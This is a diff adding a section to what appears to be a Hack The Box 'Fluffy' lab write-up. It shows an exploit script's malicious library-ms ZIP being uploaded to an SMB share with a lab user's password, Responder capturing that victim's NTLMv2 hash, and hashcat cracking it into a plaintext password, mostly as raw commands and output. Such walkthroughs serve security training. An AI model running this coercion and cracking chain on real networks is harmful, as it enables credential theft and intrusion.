@@ -233,7 +233,173 @@ python3 52310.py -i 10.10.15.80 -n payload1 -o ./output_folder --keep
 [!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.                                                                            
 ```
 
+```
+┌──(kali㉿kali)-[~/machines/fluffy/output_folder]
+└─$ ls -la        
+total 16
+drwxrwxr-x 2 kali kali 4096 Sep 12 12:33 .
+drwxrwxr-x 3 kali kali 4096 Sep 12 12:33 ..
+-rw-rw-r-- 1 kali kali  364 Sep 12 12:39 payload1.library-ms
+-rw-rw-r-- 1 kali kali  323 Sep 12 12:39 payload1.zip
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/fluffy/output_folder]
+└─$ smbclient -U j.fleischman //fluffy.htb/IT --password='J0elTHEM4n1990!'
+Try "help" to get a list of possible commands.
+smb: \> put payload1.zip
+putting file payload1.zip as \payload1.zip (3.3 kB/s) (average 3.3 kB/s)
+smb: \> 
+smb: \> 
 
+```
+
+```
+ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.15.80]
+    Responder IPv6             [dead:beef:2::114e]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-6SEG2CQ7G7H]
+    Responder Domain Name      [L6B8.LOCAL]
+    Responder DCE-RPC Port     [45330]
+
+[*] Version: Responder 3.1.7.0
+[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
+[*] To sponsor Responder: https://paypal.me/PythonResponder
+
+[+] Listening for events...                                                                                                                                                                                                         
+
+[SMB] NTLMv2-SSP Client   : 10.129.232.88
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:1bf2912eebf812e0:7B8D5180B66A4EF29E90AF01261631BE:010100000000000080C60115B342DD011AD5F376CF6125D500000000020008004C0036004200380001001E00570049004E002D003600530045004700320043005100370047003700480004003400570049004E002D00360053004500470032004300510037004700370048002E004C003600420038002E004C004F00430041004C00030014004C003600420038002E004C004F00430041004C00050014004C003600420038002E004C004F00430041004C000700080080C60115B342DD0106000400020000000800300030000000000000000100000000200000F51BC1D9F8C86B31A73AB278C396E0520A5D92F930533A1E698E2C025A425A470A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00380030000000000000000000                                                                                                                                                                                              
+[*] Skipping previously captured hash for FLUFFY\p.agila
+[*] Skipping previously captured hash for FLUFFY\p.agila
+[*] Skipping previously captured hash for FLUFFY\p.agila
+[*] Skipping previously captured hash for FLUFFY\p.agila
+[*] Skipping previously captured hash for FLUFFY\p.agila
+[*] Skipping previously captured hash for FLUFFY\p.agila
+
+```
+
+Cracking the hash:
+
+```
+hashcat -m 5600 p.agila.hash /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1469/2939 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 513 MB (1104 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+P.AGILA::FLUFFY:1bf2912eebf812e0:7b8d5180b66a4ef29e90af01261631be:010100000000000080c60115b342dd011ad5f376cf6125d500000000020008004c0036004200380001001e00570049004e002d003600530045004700320043005100370047003700480004003400570049004e002d00360053004500470032004300510037004700370048002e004c003600420038002e004c004f00430041004c00030014004c003600420038002e004c004f00430041004c00050014004c003600420038002e004c004f00430041004c000700080080c60115b342dd0106000400020000000800300030000000000000000100000000200000f51bc1d9f8c86b31a73ab278c396e0520a5d92f930533a1e698e2c025a425a470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00380030000000000000000000:prometheusx-303
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: P.AGILA::FLUFFY:1bf2912eebf812e0:7b8d5180b66a4ef29e...000000
+Time.Started.....: Sat Sep 12 12:45:07 2026 (2 secs)
+Time.Estimated...: Sat Sep 12 12:45:09 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  1781.5 kH/s (2.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4517888/14344385 (31.50%)
+Rejected.........: 0/4517888 (0.00%)
+Restore.Point....: 4513792/14344385 (31.47%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: prrprr -> progree
+Hardware.Mon.#01.: Util: 69%
+
+Started: Sat Sep 12 12:45:06 2026
+Stopped: Sat Sep 12 12:45:11 2026
+
+```
+
+Creds: `p.agila:prometheusx-303`
 
 ---
 ## User Flag
